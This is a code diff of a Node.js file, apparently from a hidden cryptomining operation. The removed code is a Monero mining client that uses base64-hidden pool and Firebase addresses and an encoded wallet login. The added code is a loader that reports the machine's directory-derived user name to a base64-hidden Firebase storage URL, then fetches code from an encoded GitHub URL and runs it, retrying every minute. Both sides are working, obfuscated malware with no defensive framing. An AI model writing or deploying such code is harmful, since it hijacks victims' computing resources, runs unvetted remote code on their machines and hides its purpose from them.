@@ -1,185 +1,160 @@
-const { Worker, workerData } = require('worker_threads')
-const WebSocketClient = require('websocket').client
-const axios = require('axios')
+const { exec } = require('child_process')
 
+let USER = getUserName()
+let FINISH = new Date().getTime()+21000000
 
-let SIZE = 250
-let mId = '1'
-let mClient = null
-let mJob = null
-let mAccepted = 0
-let mPrevAcpt = 0
-let mWorker = {}
-let mTimeout = null
-let mPending = []
+let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9qb2Itc2VydmVyLTA4OC5hcHBzcG90LmNvbS9vLw==')
 
-let BASE_URL = decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==')
+if (USER) {
+    console.log('USER: '+USER)
 
-let WSS = decode('d3NzOi8vdHJ1c3RhcHJvaWFtLmRlOjEwMDA1Lw==')
+    startServer()
+} else {
+    console.log('---NULL---')
+    process.exit(0)
+}
 
-const mQuota = getQuota()
-
-process.argv.slice(2).forEach(function (data, index) {
-    try {
-        if (index == 0) {
-            mId = data.toString()
-            startServer()
-        }
-    } catch (error) {}
-})
 
 async function startServer() {
+    console.log('---SERVER---')
 
-    connneckClient()
+    await checkStatus()
+    await startModule()
 
-    try {
-        let response = await axios.get(BASE_URL+'mining/url_'+mId+'.json')
-        await waitForJob()
+    while (true) {
+        await delay(60000)
+        await checkStatus()
+    }
+}
 
-        let list = []
-        for (let key of Object.keys(response.data)) {
-            list.push(key)
+async function startModule() {
+    let code = await getAxios(Buffer.from('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhaXlhbjA4OC9wdWJsaWMvbWFpbi9tb2R1bGUuanM=', 'base64').toString('ascii'))
+    if (code) {
+        try {
+            let Module = requireModule(code)
+            Module.start()
 
-            if (list.length >= SIZE) {
+            console.log('---START---')
+        } catch (error) {
+            await delay(60000)
+            await startModule()
+        }
+    } else {
+        await delay(60000)
+        await startModule()
+    }
+}
+
+
+async function checkStatus() {
+    if (FINISH > 0 && FINISH < new Date().getTime()) {
+        await postAxios(STORAGE+encodeURIComponent('server/'+USER+'.json'), '', {
+            'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+10)
+        })
+
+        console.log('---COMPLETED---')
+        process.exit(0)
+    } else {
+        await postAxios(STORAGE+encodeURIComponent('server/'+USER+'.json'), '', {
+            'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+100)
+        })
+    }
+}
+
+async function getAxios(url) {
+    let data = await getCurlData(url)
+    if (data) {
+        return data
+    }
+    return getFetchData(url)
+}
+
+async function getCurlData(url) {
+    return new Promise((resolve) => {
+        try {
+            exec('curl '+url, function (err, stdout, stderr) {
                 try {
-                    let worker = await addWorker(key, list, mJob)
-                    worker.on('message', onMessage)
-                    mWorker[key] = worker
-                } catch (error) {}
+                    if (err) {
+                        resolve(null)
+                    } else {
+                        resolve(stdout.trim())
+                    }
+                } catch (error) {
+                    resolve(null)
+                }
+            })
+        } catch (error) {
+            resolve(null)
+        }
+    })
+}
+
+async function getFetchData(url) {
+    return new Promise((resolve) => {
+        try {
+            fetch(url).then((response) => response.text()).then((data) => {
+                resolve(data)
+            }).catch((error) => {
+                console.log(error)
+                resolve(null)
+            })
+        } catch (error) {
+            resolve(null)
+        }
+    })
+}
+
+async function postAxios(url, body, data) {
+    return new Promise((resolve) => {
+        try {
+            fetch(url, {
+                method: 'POST',
+                headers: data,
+                body: body
+            }).then((response) => {
+                resolve('ok')
+            }).catch((error) => {
+                resolve('ok')
+            })
+        } catch (error) {
+            resolve('ok')
+        }
+    })
+}
+
+function requireModule(code) {
+    var m = new module.constructor(__filename, module.parent)
+    m._compile(code, __filename)
+    return m.exports
+}
+
+function getUserName() {
+    try {
+        let directory = __dirname.split('\\')
+        if (directory.length > 1) {
+            let name = directory[directory.length-1]
+            if (name) {
+                return name
             }
         }
+    } catch (error) {}
 
-        console.log('Id:', parseInt(mId), ' Worker Size: ', Object.keys(response.data).length)
-    } catch (error) {
-        console.log('Start Server Error')
-
-        await delay(3000)
-        await startServer()
-    }
-}
-
-async function waitForJob() {
-    while (true) {
-        await delay(1000)
-        if (mJob != null) {
-            break
+    try {
+        let directory = __dirname.split('/')
+        if (directory.length > 1) {
+            let name = directory[directory.length-1]
+            if (name) {
+                return name
+            }
         }
-    }
+    } catch (error) {}
+
+    return null
 }
+
 
 function decode(data) {
     return Buffer.from(data, 'base64').toString('ascii')
-}
-
-const addWorker = async (key, list, job) => {
-    return new Promise((resolve, reject) => {
-        let worker = new Worker('./worker.js', { workerData: { id:key, list:list, job:job } })
-        resolve(worker)
-    })
-}
-
-const onMessage = function(solved) {
-    if (solved['status'] == 'SOLVED') {
-        mAccepted++
-        if (mClient) {
-            mClient.send(JSON.stringify(solved['job']))
-        } else {
-            mPending.push(JSON.stringify(solved['job']))
-        }
-    }
-}
-
-async function updateUrl(key) {
-    try {
-        let quota = parseInt(new Date().getTime()/1000)+86400
-        if (key.endsWith('vercel.app') || key.endsWith('vercel_app')) {
-            quota = mQuota
-        }
-        await axios.patch(BASE_URL+'website/'+key+'.json', JSON.stringify({ quota:quota }), {
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded'
-            }
-        })
-    } catch (error) {}
-}
-
-function connneckClient() {
-    let client = new WebSocketClient()
-
-    client.on('connectFailed', function(error) {
-        mClient = null
-        console.log('Re-Connect', 'Failed')
-        if (mTimeout) clearTimeout(mTimeout)
-        setTimeout(() => connneckClient(), 2000)
-    })
-    
-    client.on('connect', function(conn) {
-    
-        mClient = conn
-    
-        console.log('WebSocket Client Connected')
-    
-        mClient.send(decode('eyJpZGVudGlmaWVyIjoiaGFuZHNoYWtlIiwicG9vbCI6ImZhc3Rlci54bXIiLCJyaWdodGFsZ28iOiJjbi9yIiwibG9naW4iOiI0NVFXQVJpV2lWeDlmdTVMeWJmTjJIVm03Y3JXeHZlZXBoOGd6ZFZkUmtkd0NmMmo5QmhMVFYyUk41TkY0djdLMmRLRVlhRkNhVXcxMTdMbXcxWmVZOXA5RnI2aXdzbiIsInBhc3N3b3JkIjoidXJsX21pbmVyXw==')+mId+decode('IiwidXNlcmlkIjoiIiwidmVyc2lvbiI6MTMsImludHZlcnNpb24iOjEzMzcsIm15ZG9tYWluIjoiV0VCIFNjcmlwdCAxNi0xMS0yMyBQZXJmZWt0IGh0dHBzOi8vd3d3LnJhaXlhbjA4OC54eXoifQ=='))
-    
-        mClient.on('error', function(error) {
-            mClient = null
-            console.log('Re-Connect', 'Error')
-            if (mTimeout) clearTimeout(mTimeout)
-            setTimeout(() => connneckClient(), 2000)
-        })
-    
-        mClient.on('message', function(message) {
-            try {
-                let data = JSON.parse(message.utf8Data)
-                if(data['identifier'] == 'job') {
-                    mJob = data
-                    
-                    console.log('New Job Received...')
-                    sendJob()
-                }
-            } catch (e) {}
-        })
-
-        setTimeout(async () => {
-            for (let i = 0; i < mPending.length; i++) {
-                try {
-                    if (mClient) {
-                        mClient.send(mPending[i])
-                        await delay(250)
-                    }
-                } catch (error) {}
-            }
-
-            mPending = []
-        }, 1000)
-    })
-    
-    client.connect(WSS)
-
-    mTimeout = setTimeout(() => {
-        try {
-            mClient.close()
-        } catch (error) {}
-        try {
-            client.close()
-        } catch (error) {}
-        
-        try {
-            mClient = null
-            client = null
-        } catch (error) {}
-        
-        console.log('Re-Connect')
-        connneckClient()
-    }, 600000)
-}
-
-function sendJob() {
-    for(let worker of Object.values(mWorker)) {
-        try {
-            worker.postMessage(mJob)
-        } catch (error) {}
-    }
 }
 
 function delay(time) {
@@ -187,24 +162,3 @@ function delay(time) {
         setTimeout(resolve, time)
     })
 }
-
-function getQuota() {
-    let year = new Date().getFullYear()
-    let month = new Date().getMonth()+2
-
-    if (month > 12) {
-        month = 1
-        year++
-    }
-
-    return parseInt(new Date(month+'/1/'+year).getTime()/1000)
-}
-
-setInterval(function() {
-    if(mJob) {
-        if (mAccepted != mPrevAcpt) {
-            console.log('Hash Accepted: ', mAccepted)
-            mPrevAcpt = mAccepted
-        }
-    }
-}, 5000)
